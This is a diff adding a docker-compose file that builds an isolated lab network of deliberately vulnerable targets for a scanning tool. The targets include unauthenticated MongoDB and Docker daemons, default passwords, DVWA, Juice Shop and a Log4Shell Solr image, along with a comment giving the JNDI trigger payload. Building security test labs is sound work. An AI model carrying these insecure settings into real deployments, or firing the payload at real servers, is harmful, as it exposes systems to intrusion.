@@ -1,0 +1,337 @@
+# Recce test environment — multi-service target network
+# Usage: cd test_env && sudo docker-compose up -d
+#
+# Network: 172.20.0.0/24  (recce-testnet)
+#   .10  target-linux   — SSH + Python, catches sessions, runs tunnel agent
+#   .11  web-target     — HTTP 80/8080, HTTPS 443 (nginx)
+#   .12  db-mysql       — MySQL 3306
+#   .13  smb-target     — SMB 445, NetBIOS 139
+#   .14  ftp-target     — FTP 21, TFTP 69
+#   .15  mail-target    — SMTP 25 (mailhog)
+#   .16  win-sim        — RDP-sim on 3389 (ncat echo), WinRM-sim on 5985
+#   .17  db-redis       — Redis 6379 (requirepass redis123)
+#   .18  db-postgres    — PostgreSQL 5432
+#   .19  ldap-target    — OpenLDAP 389 (anonymous bind OK) — T1
+#   .20  snmp-target    — snmpd 161/UDP, community strings public / private — T1
+#   .21  nfs-target     — NFS 2049 + rpcbind 111 (world-mountable /srv/nfs) — T1
+#   .22  mongo-target   — MongoDB 27017 (NO auth — critical exposure) — T1
+#   .23  es-target      — Elasticsearch 9200 (single-node, no security) — T1
+#   .24  dind-target    — Docker daemon exposed on 2375 (unauthenticated) — T1
+#   .25  dvwa           — DVWA (SQLi/XSS/RCE playground) 80 — T2
+#   .26  juice-shop     — OWASP Juice Shop (modern REST + GraphQL) 3000 — T2
+#   .27  log4shell      — Vulhub Solr with log4j CVE-2021-44228 — 8983 — T2
+#   .28  couch-target   — CouchDB unauthenticated 5984 — T2
+#   .29  cassandra-tgt  — Cassandra 9042 no auth — T2
+#   .30  ad-dc          — Samba-AD DC (CORP.LOCAL) — LDAP 389 / KDC 88 — T3
+#
+# T3 also ships sample files in test_env/samples/ that DON'T need the DC up:
+#   sharphound-corp.zip  — feed via ImportModal or `recce ad <path>` (3 findings)
+#   certipy-corp.json    — feed via ImportModal or `recce ad <path>`   (4 findings)
+
+version: "3.8"
+
+networks:
+  recce-testnet:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 172.20.0.0/24
+
+services:
+  # ── Primary target: SSH + Python (for sessions, tunnels, port fwd) ───────
+  target-linux:
+    build:
+      context: .
+      dockerfile: Dockerfile.target
+    hostname: target-linux
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.10
+    ports:
+      - "2222:22"
+    restart: unless-stopped
+
+  # ── Web target: nginx with HTTP + HTTPS ──────────────────────────────────
+  web-target:
+    image: nginx:alpine
+    hostname: web-target
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.11
+    volumes:
+      - ./web-content:/usr/share/nginx/html:ro
+      - ./nginx.conf:/etc/nginx/conf.d/default.conf:ro
+    restart: unless-stopped
+
+  # ── Database target: MySQL + Redis + PostgreSQL ──────────────────────────
+  db-mysql:
+    image: mysql:8.0
+    hostname: db-mysql
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.12
+    environment:
+      MYSQL_ROOT_PASSWORD: toor
+      MYSQL_DATABASE: testdb
+      MYSQL_USER: dbuser
+      MYSQL_PASSWORD: dbpass123
+    restart: unless-stopped
+
+  db-redis:
+    image: redis:7-alpine
+    hostname: db-redis
+    command: redis-server --requirepass redis123
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.17
+    restart: unless-stopped
+
+  db-postgres:
+    image: postgres:15-alpine
+    hostname: db-postgres
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.18
+    environment:
+      POSTGRES_PASSWORD: pgpass123
+      POSTGRES_USER: pguser
+      POSTGRES_DB: testdb
+    restart: unless-stopped
+
+  # ── SMB target (Samba) ───────────────────────────────────────────────────
+  smb-target:
+    build:
+      context: .
+      dockerfile: Dockerfile.smb
+    hostname: smb-target
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.13
+    restart: unless-stopped
+
+  # ── FTP target ───────────────────────────────────────────────────────────
+  ftp-target:
+    image: fauria/vsftpd
+    hostname: ftp-target
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.14
+    environment:
+      FTP_USER: ftpuser
+      FTP_PASS: ftppass123
+      PASV_ADDRESS: 172.20.0.14
+      PASV_MIN_PORT: 21100
+      PASV_MAX_PORT: 21110
+    restart: unless-stopped
+
+  # ── Mail target (SMTP) ──────────────────────────────────────────────────
+  mail-target:
+    image: mailhog/mailhog
+    hostname: mail-target
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.15
+    restart: unless-stopped
+
+  # ── Windows simulation: ncat listeners on RDP/WinRM ports ───────────────
+  win-sim:
+    build:
+      context: .
+      dockerfile: Dockerfile.winsim
+    hostname: win-sim
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.16
+    restart: unless-stopped
+
+  # ══════════════════════════════════════════════════════════════════════════
+  # T1 additions — unlock scan modules that had no targets in the base env.
+  # Everything below uses off-the-shelf images (no Dockerfiles) so the env
+  # comes up in one `docker compose up -d` without a rebuild.
+  # ══════════════════════════════════════════════════════════════════════════
+
+  # ── LDAP target: anonymous bind allowed, sample OU tree — for `ldap` + `credenum`
+  ldap-target:
+    image: osixia/openldap:1.5.0
+    hostname: ldap-target
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.19
+    environment:
+      LDAP_ORGANISATION: "Recce Test Co"
+      LDAP_DOMAIN: "recce.test"
+      LDAP_ADMIN_PASSWORD: "ldap123"
+      LDAP_READONLY_USER: "true"
+      LDAP_READONLY_USER_USERNAME: "readonly"
+      LDAP_READONLY_USER_PASSWORD: "readonly"
+    restart: unless-stopped
+
+  # ── SNMP target: snmpd with default community strings — for `snmp` scan.
+  # `polinux/snmpd` responds to SNMPv1/v2c with community `public` / `private`.
+  snmp-target:
+    image: polinux/snmpd
+    hostname: snmp-target
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.20
+    restart: unless-stopped
+
+  # ── NFS target: world-mountable export — for `nfs` + `showmount` scans.
+  # Alpine-based, exports /srv/nfs no_root_squash for realistic ROE testing.
+  nfs-target:
+    image: itsthenetwork/nfs-server-alpine:latest
+    hostname: nfs-target
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.21
+    privileged: true           # NFS needs this to load nfsd kernel module
+    environment:
+      SHARED_DIRECTORY: /nfsshare
+    volumes:
+      - nfs-share:/nfsshare
+    restart: unless-stopped
+
+  # ── MongoDB unauthenticated — the classic public-facing exposure.
+  # `--noauth` explicitly so any client connecting can list DBs / read.
+  mongo-target:
+    image: mongo:6
+    hostname: mongo-target
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.22
+    command: ["mongod", "--noauth", "--bind_ip_all"]
+    restart: unless-stopped
+
+  # ── Elasticsearch single-node, security off — public cluster exposure.
+  # Small heap so it fits on a laptop; not a perf test target.
+  es-target:
+    image: docker.elastic.co/elasticsearch/elasticsearch:8.11.0
+    hostname: es-target
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.23
+    environment:
+      discovery.type: single-node
+      xpack.security.enabled: "false"
+      ES_JAVA_OPTS: "-Xms512m -Xmx512m"
+    ulimits:
+      memlock:
+        soft: -1
+        hard: -1
+    restart: unless-stopped
+
+  # ── Docker-in-Docker with the daemon socket exposed on 2375 (no TLS, no
+  # auth) — the exposure the `docker` scan module looks for. Never expose a
+  # real Docker daemon this way; this is only appropriate for the lab net.
+  dind-target:
+    image: docker:24-dind
+    hostname: dind-target
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.24
+    privileged: true
+    environment:
+      DOCKER_TLS_CERTDIR: ""      # disable TLS so port 2375 comes up plain
+    command: ["dockerd", "-H", "tcp://0.0.0.0:2375", "-H", "unix:///var/run/docker.sock"]
+    restart: unless-stopped
+
+  # ══════════════════════════════════════════════════════════════════════════
+  # T2 additions — vulnerable web apps + real KEV/CVE targets so the deep
+  # web/vuln pipeline (nuclei, --aggressive NSE, web --crawl) has meaningful
+  # exercises. Every target here has DOCUMENTED CVEs or intentional vulns.
+  # ══════════════════════════════════════════════════════════════════════════
+
+  # ── DVWA — SQLi / XSS / RCE / CSRF / file-upload playground.
+  # Web scan target for `web --crawl`, `nuclei`, `--aggressive` NSE.
+  dvwa:
+    image: vulnerables/web-dvwa
+    hostname: dvwa
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.25
+    restart: unless-stopped
+
+  # ── OWASP Juice Shop — modern SPA + REST + GraphQL.
+  # Great target for `api` (OpenAPI/IDOR), `web --crawl` + form fuzz,
+  # nuclei modern-app templates, JWT / SQLi in a realistic stack.
+  juice-shop:
+    image: bkimminich/juice-shop
+    hostname: juice-shop
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.26
+    restart: unless-stopped
+
+  # ── Log4Shell (CVE-2021-44228) via Vulhub's vulnerable Solr image.
+  # Concrete KEV target — nuclei/nse should flag it. Solr Admin UI on 8983.
+  # Trigger: /solr/admin/cores?action=${jndi:ldap://<host>/x}
+  log4shell:
+    image: vulhub/solr:8.11.0
+    hostname: log4shell
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.27
+    restart: unless-stopped
+
+  # ── CouchDB unauthenticated — 5984 admin party mode.
+  # Rounds out the `couchdb` scan module.
+  couch-target:
+    image: couchdb:3
+    hostname: couch-target
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.28
+    environment:
+      COUCHDB_USER: admin
+      COUCHDB_PASSWORD: admin
+    restart: unless-stopped
+
+  # ── Cassandra with default auth off — 9042 CQL.
+  # Rounds out the `cassandra` scan module.
+  cassandra-tgt:
+    image: cassandra:3
+    hostname: cassandra-target
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.29
+    environment:
+      CASSANDRA_CLUSTER_NAME: "recce-lab"
+    restart: unless-stopped
+
+  # ══════════════════════════════════════════════════════════════════════════
+  # T3 — Realistic Active Directory (Samba as an AD DC).
+  # Domain: CORP.LOCAL   Admin: Administrator / Passw0rd!
+  #
+  # This is BEST-EFFORT — samba-domain wants privileged mode, hostname
+  # resolution, and can be picky about kernel modules. If the container
+  # doesn't come up cleanly, the sample importer files in test_env/samples/
+  # cover the same testing surface (SharpHound/Certipy → findings) without
+  # needing a live DC.
+  #
+  # When live, exercises: ldap (389/636), Kerberos KDC (88), DNS (53),
+  # SMB (445), Global Catalog (3268). Real targets for `credenum`,
+  # `kerberoast`, `asrep`, `ldap-enum`, and the `ad` importer's live path.
+  # ══════════════════════════════════════════════════════════════════════════
+  ad-dc:
+    image: nowsci/samba-domain:latest
+    hostname: dc01
+    domainname: corp.local
+    networks:
+      recce-testnet:
+        ipv4_address: 172.20.0.30
+    privileged: true
+    environment:
+      DOMAIN: CORP.LOCAL
+      DOMAINPASS: Passw0rd!
+      DOMAIN_NETBIOS: CORP
+      NOCOMPLEXITY: "true"
+      INSECURELDAP: "true"
+      DNSFORWARDER: "8.8.8.8"
+      HOSTIP: 172.20.0.30
+    tmpfs:
+      - /run
+      - /run/lock
+    restart: unless-stopped
+
+volumes:
+  nfs-share:
